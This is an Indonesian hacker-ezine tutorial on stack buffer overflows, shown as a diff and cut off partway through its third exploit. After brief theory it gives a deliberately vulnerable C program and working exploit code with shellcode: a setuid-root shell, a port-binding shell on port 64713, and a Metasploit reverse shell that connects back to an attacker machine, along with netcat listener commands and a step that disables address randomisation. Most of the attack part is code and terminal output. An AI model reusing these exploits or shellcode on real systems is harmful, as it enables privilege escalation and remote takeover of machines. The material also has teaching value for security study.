@@ -1,0 +1,692 @@
+﻿Terbitan Online Kecoak Elektronik
+http://www.kecoak-elektronik.net
+
+===========================================================================
+Stack-based Buffer Overflow
+by: Cyb3rh3b [mailto: cyb3rh3b@kecoak-elektronik.net] 
+Kecoak Elektronik Indonesia
+===========================================================================
+
+[ ~ Simple Buffer Overflow
+
+Salam!
+
+Saat ini artikel mengenai buffer overflow sudah banyak kita temukan di seluruh
+penjuru dunia cyber (internet?!), dan saya yakin banyak sekali yang sudah mengetahui
+bahwa buffer overflow merupakan salah satu tehnik tertua yang masih terus berkembang
+hingga saat ini dimana banyak sekali digunakan untuk meng-exploitasi baik sistem
+maupun program aplikasi. Namun mungkin artikel sejenis yang tertuang dalam bahasa
+Indonesia masih jarang ditemukan, oleh karena itulah saya mencoba memberikan
+gambaran proses exploitasi suatu program dengan memanfaatkan buffer overflow dan
+tentu saja tujuan nya satu...yaitu untuk mendapatkan rootshell pada sistem korban
+:).
+
+Buffer overflow inti nya membuat buffer (baca:penampung) kelebihan muatan sehingga
+isi nya tumpah. Dalam dunia pemrograman, istilah ini berhubungan dengan memory,
+karena suatu program pasti akan berhubungan dengan suatu lokasi di memory. Ada
+berbagai jenis alokasi memory, dan yang akan saya bahas kali ini adalah memory stack
+yang umum nya digunakan pada saat suatu program memanggil suatu fungsi. Berikut ini
+contoh fungsi dalam bahasa C:
+
+[Cyb3rh3b@k-elektronik]$ cat fungsi.c
+
+int fungsi_hitung ( int a, int b, int c, int d )
+{
+
+   int hasil;
+
+   hasil = a+b+c+d;
+
+}
+
+
+fungsi pada program di atas memiliki local variable yang diberi nama "hasil", serta
+4 buah parameter fungsi yaitu a, b, c, dan d. Saat fungsi tersebut dijalankan, maka
+akan di lakukan inisialisasi pada suatu lokasi memory yang disebut "stack" untuk
+menampung kelima buah variable diatas (hasil, a, b, c, d). Selain local variabel dan
+parameter fungsi, akan di simpan juga informasi "return address (ret)" serta "stack
+frame pointer (sfp)" pada stack memory. Berikut gambaran nya:
+
+-------------------------------------
+hasil
+-------------------------------------
+stack frame pointer (sfp)
+-------------------------------------
+return address (ret)
+-------------------------------------
+a
+-------------------------------------
+b
+-------------------------------------
+c
+-------------------------------------
+d
+-------------------------------------
+
+Struktur pada stack diatas dinamakan "stack frame".
+
+
+Saat eksekusi suatu program aplikasi, prosesor hanya akan menjalankan satu buah
+instruksi pada satu waktu. Dan apabila pada program tersebut dipanggil suatu fungsi
+(misal:fungsi_hitung diatas), maka prosesor akan menyimpan lokasi terakhir eksekusi
+(yang di pegang oleh register EIP) pada "return address" stack frame diatas. Dan
+setelah itu barulah prosesor menjalankan code-code pada fungsi_hitung, setelah
+selesai dengan code-code pada fungsi_hitung maka prosesor akan mengembalikan nilai
+yang tersimpan pada "return address" stack frame ke EIP dan kembali melanjutkan code
+program aplikasi yang utama.
+
+Kondisi buffer overflow pada stack akan terjadi misal nya apabila nilai variable
+"hasil" tidak di tangani dengan baik, sehingga isi nya akan tumpah dan
+meng-overwrite nilai "return address (ret)" pada stack frame diatas. Pada aplikasi
+normal, kondisi ini akan menyebabkan aplikasi crash dan exit(1)...namun dengan
+menggunakan teknik-teknik khusus kita dapat memberikan nilai tertentu pada "return
+address (ret)" tersebut sehingga begitu prosesor selesai menjalankan fungsi_hitung
+dan akan kembali ke program utama dengan membaca nilai pada "return address (ret)",
+kita dapat mengarahkan prosesor untuk menjalankan command-command yang kita
+inginkan, kondisi inilah yang disebut exploitasi pada buffer overflow.
+
+
+
+
+[ ~ STOP de Theory !!!
+
+Saya rasa cukup teori mengenai buffer overflow, untuk lebih jelas nya tentang buffer
+overflow ini silahkan baca artikel nya aleph1 mengenai "Smashing The Stack For Fun
+and Profit" atau cari referensi lain nya di internet :). Untuk selanjut nya, saya
+akan memperlihatkan teknik exploitasi yang memanfaatkan buffer overflow ini untuk
+mendapatkan shell suatu sistem (baca:nge-root!).
+
+Berikut ini adalah contoh program yang memiliki hole buffer overflow:
+
+[Cyb3rh3b@k-elektronik]$ cat vuln.c
+
+#include <stdlib.h>
+
+void buffer_overflow(char *str)
+{
+
+   char buffer[500];
+
+   strcpy(buffer,str);
+
+   puts(buffer);
+}
+
+
+int main(int argc, char *argv[])
+{
+
+   buffer_overflow(argv[1]);
+
+   return 0;
+}
+
+
+[Cyb3rh3b@k-elektronik]$ gcc vuln.c -o vuln
+[Cyb3rh3b@k-elektronik]$ ./vuln  Viva_La_Cucaracha
+Viva_La_Cucaracha
+
+Program di atas sebenar nya simple saja, yaitu mengambil data input an dari user dan
+menampilkan nya ke layar. Berikut ini adalah stack frame (struktur stack) saat
+fungsi buffer_overflow dipanggil:
+
+~~ STACK-MEMORY ~~
+-------------------------------------
+buffer
+-------------------------------------
+stack frame pointer (sfp)
+-------------------------------------
+return address (ret)
+-------------------------------------
+str
+-------------------------------------
+~~ Sisa memory stack ~~
+-------------------------------------
+
+
+Variabel buffer di set untuk menampung 500 byte karakter, namun apa yang akan
+terjadi apabila fungsi tersebut diberikan inputan lebih dari 500 byte?!yup, akan
+terjadi buffer overflow dan efek nya akan menyebabkan lokasi "return address (ret)"
+dan "stack frame pointer (sfp)" di overwrite nilai nya. Bagaimana cara nya
+meng-exploitasi program tersebut?!Berikut ini akan di tunjukan beberapa jenis
+inputan user mulai dari 400 karakter, 500 karakter, dan 600 karakter:
+
+[Cyb3rh3b@k-elektronik]$ ./vuln `perl -e 'print "A"x400'`
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+** Achtung: tanda petik sebelum perl adalah backtick(`) bukan tanda petik tunggal (');
+
+[Cyb3rh3b@k-elektronik]$ ./vuln `perl -e 'print "A"x500'`
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+[Cyb3rh3b@k-elektronik]$ ./vuln `perl -e 'print "A"x600'`
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Segmentation fault
+
+
+Aha, dapat kita lihat bahwa apabila di berikan input berupa 600 byte karakter,
+program tersebut diatas akan mengalamai crash (segmentation fault), dan untuk
+memastikan nya apakah benar data input tersebut tumpah hingga masuk ke "return
+address (ret)" stack frame  dan kemudian di teruskan ke EIP register dapat
+menggunakan aplikasi gdb seperti berikut ini:
+
+[Cyb3rh3b@k-elektronik]$ gdb ./vuln
+GNU gdb 6.3
+Copyright 2004 Free Software Foundation, Inc.
+GDB is free software, covered by the GNU General Public License, and you are
+welcome to change it and/or distribute copies of it under certain conditions.
+Type "show copying" to see the conditions.
+There is absolutely no warranty for GDB.  Type "show warranty" for details.
+This GDB was configured as "i486-slackware-linux"...Using host libthread_db library
+"/lib/tls/libthread_db.so.1".
+
+(gdb) run `perl -e 'print "A"x600'`
+Starting program: /home/rasyid/h4x0r/article/vuln `perl -e 'print "A"x600'`
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+Program received signal SIGSEGV, Segmentation fault.
+0x41414141 in ?? ()
+
+(gdb) i r
+eax            0x259    601
+ecx            0x0      0
+edx            0xb7fd07e0       -1208154144
+ebx            0xb7fceffc       -1208160260
+esp            0xbffff370       0xbffff370
+ebp            0x41414141       0x41414141
+esi            0xbffff414       -1073744876
+edi            0xbffff3a0       -1073744992
+eip            0x41414141       0x41414141
+eflags         0x200286 2097798
+cs             0x73     115
+ss             0x7b     123
+ds             0x7b     123
+es             0x7b     123
+fs             0x0      0
+gs             0x33     51
+
+------------- Cut Here --------------------
+
+
+Bisa dilihat isi register eip adalah 0x41414141, yang berarti nilai hexadecimal
+untuk karakter "A". Dengan kata lain, apabila di masukan karakter "A" sebanyak 600x
+maka akan membanjiri buffer dan tumpah hingga meng-overwrite isi dari "return
+address (ret)", setelah prosesor selesai menjalankan fungsi buffer_overflow() maka
+isi dari "return address (ret)" akan di copy ke register eip, dan prosesor akan
+mencari lokasi memory yang ditunjukan oleh eip tersebut untuk menjalankan program
+utama berikut nya. Namun ternyata isi eip tersebut adalah 0x41414141 (karakter
+"AAAA"), prosesor akan mencari lokasi tersebut di memory dan yang pasti akan
+menemukan kegagalan (alamat tersebut tidak ada atau berisi instruksi yang berbeda
+dari seharus nya), sehingga program akan crash dengan pesan "Segmentation Fault".
+
+Proses exploitasi program tersebut adalah membelokan jalan nya prosesor sehingga
+prosesor menjalankan suatu code-code tertentu (disebut bytecode) di memory, untuk
+membelokan jalan nya prosesor inilah kita manfaatkan buffer overflow diatas.
+
+
+[ ~ R00tShell, R00tShell, R00tShell !!!
+
+Inti dari proses exploitasi adalah kita memasukan suatu bytecode tertentu pada
+buffer program diatas sehingga proses kerja prosesor dapat di belokan untuk
+meng-eksekusi code-code yang kita inginkan. Bytecode dibuat dalam bentuk yang dapat
+langsung di masukan pada memory, dan code-code tersebut umum nya untuk membangkitkan
+shell...sehingga bytecode yang dimasukan pada exploit sering disebut shellcode.
+Penjelasan mengenai apa itu shellcode pernah saya tulis sebelum nya untuk komunitas
+ECHO, silahkan lihat pada ezine edisi ke-14 komunitas echo
+(http://ezine.echo.or.id).
+
+Pada proses exploitasi kali ini, kita akan membuat buffer overflow pada buffer
+program vuln.c diatas. Dan kemudian buffer tersebut akan dijadikan input bagi
+program vuln. Namun sebelum nya kita harus meng-analsis terlebih dahulu program
+vuln.c diatas.
+
+Pada program tersebut, buffer dapat menampung 500 byte karakter. Buffer akan
+overflow apabila menerima input 600 byte karakter, sehingga tujuan kita adalah
+membentuk buffer yang berukuran 600 bytes dimana didalam nya terdapat shellcode
+untuk di eksekusi oleh program vuln tersebut. Pada proses exploitasi, salah satu hal
+yang kompleks adalah menentukan lokasi shellcode pada memory, kita akan memasukan
+shellcode ke dalam buffer melalui input an user...namun kita tidak mengetahui lokasi
+buffer yang sebenar nya pada memory. Untuk itulah digunakan acuan stack pointer,
+pada program vuln.c diatas fungsi overflow akan langsung di eksekusi oleh program,
+dengan kata lain lokasi buffer tidak akan jauh dari nilai stack pointer (SP) yang
+menyimpan lokasi stack saat fungsi baru saja dipanggil. 
+
+Kita tidak dapat menentukan lokasi sebenar nya dari shellcode tersebut, yang dapat
+kita lakukan hanya memperkirakan lokasi tersebut pada buffer. Untuk dapat
+mengarahkan ke lokasi shellcode yang tepat, maka ada 2 tehnik yang digunakan. Yang
+pertama adalah memasukan instrusksi NOP pada buffer, instruksi NOP biasa nya
+digunakan untuk proses interval dimana prosesor tidak melakukan instruksi apapun,
+dan prosesor akan bergerak ke alamat berikut nya pada memory tanpa melakukan apapun
+(No Operation). Dengan memberikan instruksi NOP di lokasi awal buffer, maka kita
+dapat mengarahkan prosesor ke lokasi NOP manapun dan kemudian membiarkan prosesor
+menjalankan operasi NOP tersebut sampai akhir nya menemukan lokasi shellcode yang
+sebenar nya.
+
+Teknik kedua adalah menempatkan lokasi memory tempat NOP dan ShellCode kira-kira
+berada pada sisa (akhir) buffer, sehingga bagian manapun dari buffer yang akan
+meng-overwrite "return address (ret)" tidak masalah. Kira-kira, seperti ini lah
+bentuk buffer yang akan kita buat untuk dijadikan input terhadap program vuln.c
+diatas:
+
+
+| NOP;NOP;NOP...200x| -- -Shell Code Here --- | Lokasi Memory utk overwrite return
+address |
+
+|--------------------------------------------- 600 bytes
+----------------------------------|
+
+
+binun yak?!=p. Nanti di akhir artikel akan saya berikan beberapa referensi tentang
+buffer overflow kok, untuk saat ini...saya lebih menekankan pada praktek nya aja :).
+Yang berikut nya adalah program exploit untuk mengeksploitasi aplikasi vuln.c
+diatas, namun sebelum nya ada beberapa hal yang harus dilakukan sebelum melakukan
+proses exploitasi:
+
+1. Menggunakan sistem operasi linux
+2. Non-aktifkan fungsi randomize virtual memory pada kernel:
+
+# echo "0" > /proc/sys/kernel/randomize_va_space
+
+3. Ubah ownership pada program vuln diatas menjadi milik root dan ubah mode nya
+menjadi suid program.
+
+# chown root vuln
+# chmod +s vuln
+# ls -l
+-rwsr-sr-x  1 root   users 11205 Aug 13 01:40 vuln
+
+That's it!!! Program yang akan di eksploitasi merupakan suid aplikasi dengan
+ownership root, dan untuk saat ini fitur randomize virtual memory linux nya di
+non-aktifkan terlebih dahulu, hal ini untuk mempermudah menunjukan dasar proses
+exploitasi. Untuk proses exploitasi saya akan menggunakan beberapa macam shellcode,
+shellcode adalah code-code yang akan di eksekusi oleh prosesor untuk dijalankan
+sesaat setelah program di buffer overflow kan.
+
+Shellcode yang digunakan saya ambil dari milw0rm (www.milw0rm.com) dan hasil
+generate dari metasploit (www.metasploit.com). Here we go!
+
+
+[Cyb3rh3b@k-elektronik]$ cat exploit-setuid0.c
+
+#include <stdlib.h>
+
+char shellcode[] =
+
+/* ---------------------- Begin ShellCode ---------------------- */
+
+/*
+ * (Linux/x86) setuid(0) + execve("/bin/sh", ["/bin/sh", NULL])
+ * - 31 bytes
+ * - xgc@gotfault.net
+ *
+ */
+
+  "\x6a\x17"                    // push $0x17
+  "\x58"                        // pop  %eax
+  "\x31\xdb"                    // xor  %ebx, %ebx
+  "\xcd\x80"                    // int  $0x80
+
+  "\x31\xd2"                    // xor  %edx, %edx
+  "\x6a\x0b"                    // push $0xb
+  "\x58"                        // pop  %eax
+  "\x52"                        // push %edx
+  "\x68\x2f\x2f\x73\x68"        // push $0x68732f2f
+  "\x68\x2f\x62\x69\x6e"        // push $0x6e69622f
+  "\x89\xe3"                    // mov  %esp, %ebx
+  "\x52"                        // push %edx
+  "\x53"                        // push %ebx
+  "\x89\xe1"                    // mov  %esp, %ecx
+  "\xcd\x80";                   // int  $0x80;
+
+ // milw0rm.com [2006-04-03]
+
+/* -------------------- End Of ShellCode ------------------------- */
+
+
+/* Fungsi untuk mendapatkan lokasi stack pointer */
+unsigned long sp(void)        
+{ __asm__("movl %esp, %eax");} 
+
+int main(int argc, char *argv[])
+{
+   int i, offset;
+   long esp, ret, *addr_ptr;
+   char *buffer, *ptr;
+
+   offset = 0; 
+   esp = sp();
+   ret = esp - offset;
+
+printf("Stack pointer (ESP) : 0x%x\n", esp);
+printf("    Offset from ESP : 0x%x\n", offset);
+printf("Desired Return Addr : 0x%x\n", ret);
+
+/* Alokasikan 600 byte pada buffer (heap) */
+ buffer = malloc(600);
+
+/* Isi seluruh buffer dengan lokasi memory yang di inginkan                */
+/* dlm hal ini merupakan alamat stack pointer saat fungsi dipanggil  */
+ ptr = buffer;
+ addr_ptr = (long *) ptr;
+ for(i=0; i < 600; i+=4)
+ { *(addr_ptr++) = ret; }
+
+/* Timpa isi buffer (200 lokasi awal) dengan instruksi NOP */
+ for(i=0; i < 200; i++)
+ { buffer[i] = '\x90'; }
+
+/* Letakan shellcode diatas setelah NOP-sled */
+ ptr = buffer + 200;
+ for(i=0; i < strlen(shellcode); i++)
+ { *(ptr++) = shellcode[i]; }
+
+/* End the string */
+ buffer[600-1] = 0;
+
+/* Panggil program vuln dengan buffer diatas sbg input an nya */
+ execl("./vuln", "vuln", buffer, 0);
+
+// Free the buffer memory
+ free(buffer);
+
+   return 0;
+}
+
+
+Program exploit diatas akan melakukan lokal exploit terhadap aplikasi vuln dan
+membangkitkan root shell, harap di perhatikan bahwa exploit diatas harus di eksekusi
+dalam direktori yang sama dengan dengan aplikasi vuln yang akan kita eksploit
+(perhatikan bahwa saat ini user sebagai user biasa, prompt "$")
+
+
+[Cyb3rh3b@k-elektronik]$ gcc exploit-setuid0.c -o exploit-setuid0
+[Cyb3rh3b@k-elektronik]$ ls -l
+-rwxr-xr-x  1 rasyid users 11906 Aug 13 01:27 exploit-setuid0
+-rw-r--r--  1 rasyid users  1985 Aug 13 00:08 exploit-setuid0.c
+-rwsr-sr-x  1 root   users 11205 Aug 13 01:40 vuln
+-rw-r--r--  1 rasyid users   207 Aug 13 01:40 vuln.c
+
+[Cyb3rh3b@k-elektronik]$ id
+uid=1005(rasyid) gid=100(users) groups=100(users)
+
+[Cyb3rh3b@k-elektronik]$ ./exploit-setuid0
+Stack pointer (ESP) : 0xbffff578
+    Offset from ESP : 0x0
+Desired Return Addr : 0xbffff578
+jX1Û1Ò
+        XRh//shh/binãáxõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõh-3.00#id
+uid=0(root) gid=100(users) groups=100(users)
+
+Shellcode diatas berisi code-code yang akan membangkitkan shell (/bin/sh) dengan
+sebelum nya melakukan set uid=0 (nice w0rk xgc! :) ). Begitu lah cara kerja exploit
+dan kita baru saja mempraktekan cara meng-exploit program "vuln" dan mendapatkan
+akses root (istilah gaol nya: nge-root) pada sistem, atau biasa di sebut lokal
+exploit :).
+
+
+[ ~ Linux port-bind Shell !!!
+
+Pada contoh berikut nya, program exploit yang akan digunakan masih tetap sama namun
+kita akan menggunakan shellcode yang berbeda. Yaitu shellcode jenis bindshell,
+shellcode ini dapat kalian temukan pada milw0rm, shellcode ini dibuat oleh xgc dari
+GotFault security team. Fungsi dari shellcode ini adalah membuka port pada sistem
+setelah dilakukan exploitasi program "vuln". Berikut ini exploit yang memanfaatkan
+shellcode linux port bind:
+
+[Cyb3rh3b@k-elektronik]$ cat exploit-port-bind.c
+
+#include <stdlib.h>
+
+char shellcode[] =
+
+/* ---------------------- Begin ShellCode ------------------------*/
+
+/*
+ * portbind shellcode 86 bytes for Linux/x86
+ * Copyright (c) 2006 Gotfault Security <xgc@gotfault.net>
+ *
+ * portbind shellcode that bind()'s a shell on port 64713/tcp
+ *
+ */
+
+
+/* socket(AF_INET, SOCK_STREAM, 0) */
+
+  "\x6a\x66"                    // push   $0x66
+  "\x58"                        // pop    %eax
+  "\x6a\x01"                    // push   $0x1
+  "\x5b"                        // pop    %ebx
+  "\x99"                        // cltd
+  "\x52"                        // push   %edx
+  "\x53"                        // push   %ebx
+  "\x6a\x02"                    // push   $0x2
+  "\x89\xe1"                    // mov    %esp,%ecx
+  "\xcd\x80"                    // int    $0x80
+
+  /* bind(s, server, sizeof(server)) */
+
+  "\x52"                        // push   %edx
+  "\x66\x68\xfc\xc9"            // pushw  $0xc9fc  // PORT = 64713
+  "\x66\x6a\x02"                // pushw  $0x2
+  "\x89\xe1"                    // mov    $esp,%ecx
+  "\x6a\x10"                    // push   $0x10
+  "\x51"                        // push   %ecx
+  "\x50"                        // push   %eax
+  "\x89\xe1"                    // mov    %esp,%ecx
+  "\x89\xc6"                    // mov    %eax,%esi
+  "\x43"                        // inc    %ebx
+  "\xb0\x66"                    // mov    $0x66,%al
+  "\xcd\x80"                    // int    $0x80
+
+  /* listen(s, anything) */
+
+  "\xb0\x66"                    // mov    $0x66,%al
+  "\xd1\xe3"                    // shl    %ebx
+  "\xcd\x80"                    // int    $0x80
+
+  /* accept(s, 0, 0) */
+
+  "\x52"                        // push   %edx
+  "\x56"                        // push   %esi
+  "\x89\xe1"                    // mov    %esp,%ecx
+  "\x43"                        // inc    %ebx
+  "\xb0\x66"                    // mov    $0x66,%al
+  "\xcd\x80"                    // int    $0x80
+
+  "\x93"                        // xchg   %eax,%ebx
+
+  /* dup2(c, 2) , dup2(c, 1) , dup2(c, 0) */
+
+  "\x6a\x02"                    // push   $0x2
+  "\x59"                        // pop    %ecx
+
+  "\xb0\x3f"                    // mov    $0x3f,%al
+  "\xcd\x80"                    // int    $0x80
+  "\x49"                        // dec    %ecx
+  "\x79\xf9"                    // jns    dup_loop
+
+  /* execve("/bin/sh", ["/bin/sh"], NULL) */
+
+  "\x6a\x0b"                    // push   $0xb
+  "\x58"                        // pop    %eax
+  "\x52"                        // push   %edx
+  "\x68\x2f\x2f\x73\x68"        // push   $0x68732f2f
+  "\x68\x2f\x62\x69\x6e"        // push   $0x6e69622f
+  "\x89\xe3"                    // mov    %esp, %ebx
+  "\x52"                        // push   %edx
+  "\x53"                        // push   %ebx
+  "\x89\xe1"                    // mov    %esp, %ecx
+  "\xcd\x80";                   // int    $0x80;
+
+/* -------------------- End Of ShellCode ------------------------- */
+
+/* Fungsi untuk mendapatkan lokasi stack pointer */
+unsigned long sp(void)        
+{ __asm__("movl %esp, %eax");} 
+
+int main(int argc, char *argv[])
+{
+   int i, offset;
+   long esp, ret, *addr_ptr;
+   char *buffer, *ptr;
+
+   offset = 0; 
+   esp = sp();
+   ret = esp - offset;
+
+printf("Stack pointer (ESP) : 0x%x\n", esp);
+printf("    Offset from ESP : 0x%x\n", offset);
+printf("Desired Return Addr : 0x%x\n", ret);
+
+/* Alokasikan 600 byte pada buffer (heap) */
+ buffer = malloc(600);
+
+/* Isi seluruh buffer dengan lokasi memory yang di inginkan                */
+/* dlm hal ini merupakan alamat stack pointer saat fungsi dipanggil  */
+ ptr = buffer;
+ addr_ptr = (long *) ptr;
+ for(i=0; i < 600; i+=4)
+ { *(addr_ptr++) = ret; }
+
+/* Timpa isi buffer (200 lokasi awal) dengan instruksi NOP */
+ for(i=0; i < 200; i++)
+ { buffer[i] = '\x90'; }
+
+/* Letakan shellcode diatas setelah NOP-sled */
+ ptr = buffer + 200;
+ for(i=0; i < strlen(shellcode); i++)
+ { *(ptr++) = shellcode[i]; }
+
+/* End the string */
+ buffer[600-1] = 0;
+
+/* Panggil program vuln dengan buffer diatas sbg input an nya */
+ execl("./vuln", "vuln", buffer, 0);
+
+// Free the buffer memory
+ free(buffer);
+
+   return 0;
+}
+
+[Cyb3rh3b@k-elektronik]$ gcc exploit-port-bind.c -o exploit-port-bind
+[Cyb3rh3b@k-elektronik]$ /sbin/ifconfig | grep inet
+          inet addr:192.168.116.130  Bcast:192.168.116.255  Mask:255.255.255.0
+          inet6 addr: fe80::20c:29ff:fede:8ecf/64 Scope:Link
+          inet addr:127.0.0.1  Mask:255.0.0.0
+          inet6 addr: ::1/128 Scope:Host
+[Cyb3rh3b@k-elektronik]$ ./exploit-port-bind
+Stack pointer (ESP) : 0xbffff578
+    Offset from ESP : 0x0
+Desired Return Addr : 0xbffff578
+jfXj[RSjáfhüQPá°fͰfÑÍVáfÍY°?Íyù                                              XRh//shh/binãá¿xõõõõõõõõõõõõõõõõõõõõõõõõõõõ¿xõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõõ
+shellcode diatas akan membuka port 64713 setelah meng-exploit program vuln, dan kita
+bisa mendapatkan shell dengan melakukan koneksi ke sistem tersebut melalui port
+64713. Program yang saya eksploitasi memiliki ip 192.168.116.130, sehingga untuk
+mendapatkan shell nya saya cukup menggunakan netcat (nc) untuk konek ke port 64713
+mesin tersebut:
+
+[saul@192.168.116.33]$ nc  192.168.116.130  64713
+uname -a
+Linux slax 2.6.15.6 #1 SMP Fri Mar 24 16:46:23 GMT 2006 i686 unknown unknown GNU/Linux
+id
+uid=1005(rasyid) gid=100(users) groups=100(users)
+
+
+[ ~ Linux Reverse (connect-back) Shell !!!
+
+Selain memanfaatkan shellcode yang terdapat pada situs-situs seperti milw0rm, kita
+juga dapat meng-generate shellcode untuk di sesuaikan dengan kebutuhan sendiri.
+Salah satu tools yang paling mudah digunakan adalah metasploit. Untuk membuat
+payload (shellcode) kita dapat memanfaatkan fitur msfweb nya metasploit, cukup
+aktifkan fitur tersebut dan langsung akses http://localhost:55555
+
+Pada menu msfweb terdapat menu payload, dan kemudian pilihlah payload reverse-shell
+untuk sistem operasi linux (Linux IA32 Reverse Shell). Pada LHOST isi alamat IP
+lokal yang akan menerima connect-back shell dari target, dan LPORT pilih local port
+dimana kita akan menerima koneksi dari target. Pada contoh ini saya akan menunjukan
+bahwa target memiliki IP 192.168.116.130 dan mesin attacker yang akan menerima
+koneksi reverse-shell memiliki IP 192.168.116.133, berikut ini hasil generate
+payload nya:
+
+char shellcode[] =
+"\x33\xc9\x83\xe9\xee\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x77"
+"\xd3\x60\x7c\x83\xeb\xfc\xe2\xf4\x46\x08\x33\x3f\x24\xb9\x62\x16"
+"\x11\x8b\xe9\x9d\xba\x53\xf3\x25\xc7\xec\xad\xfc\x3e\xaa\x99\x27"
+"\x2d\xbb\xa0\xd4\x03\x51\x06\x14\x78\xb0\x23\x1a\x24\x5a\x81\xcc"
+"\x11\x83\x31\x2f\xfe\x32\x23\xb1\xf7\x81\x08\x53\x58\xa0\x08\x14"
+"\x58\xb1\x09\x12\xfe\x30\x32\x2f\xfe\x32\xd0\x77\xba\x53\x60\x7c";
+
+
+Sebelum melakukan exploitasi, terlebih dahulu dibuka port 3939 pada mesin
+192.168.116.133 dimana mesin tersebut akan menerima shell (reverse-shell) dari mesin
+korban (192.168.116.130). Untuk menerima koneksi ini digunakan program netcat (nc):
+
+[Cyb3rh3b@192.168.116.133]# nc -l -p 3939 -vv
+listening on [any] 3939 ...
+
+Selanjut nya pada mesin target, masukan shellcode diatas pada bagian shellcode
+exploit, sehingga hasil nya:
+
+
+[Cyb3rh3b@192.168.116.130]$ cat exploit-reverse-shell.c
+
+#include <stdlib.h>
+
+char shellcode[] =
+
+/* ---------------------- Begin ShellCode ------------------------*/
+
+"\x33\xc9\x83\xe9\xee\xd9\xee\xd9\x74\x24\xf4\x5b\x81\x73\x13\x77"
+"\xd3\x60\x7c\x83\xeb\xfc\xe2\xf4\x46\x08\x33\x3f\x24\xb9\x62\x16"
+"\x11\x8b\xe9\x9d\xba\x53\xf3\x25\xc7\xec\xad\xfc\x3e\xaa\x99\x27"
+"\x2d\xbb\xa0\xd4\x03\x51\x06\x14\x78\xb0\x23\x1a\x24\x5a\x81\xcc"
+"\x11\x83\x31\x2f\xfe\x32\x23\xb1\xf7\x81\x08\x53\x58\xa0\x08\x14"
+"\x58\xb1\x09\x12\xfe\x30\x32\x2f\xfe\x32\xd0\x77\xba\x53\x60\x7c";
+
+/* ---------------------- End Of Shellcode -----------------------*/
+
+
+/* Fungsi untuk mendapatkan lokasi stack pointer */
+unsigned long sp(void)        
+{ __asm__("movl %esp, %eax");} 
+
+int main(int argc, char *argv[])
+{
+   int i, offset;
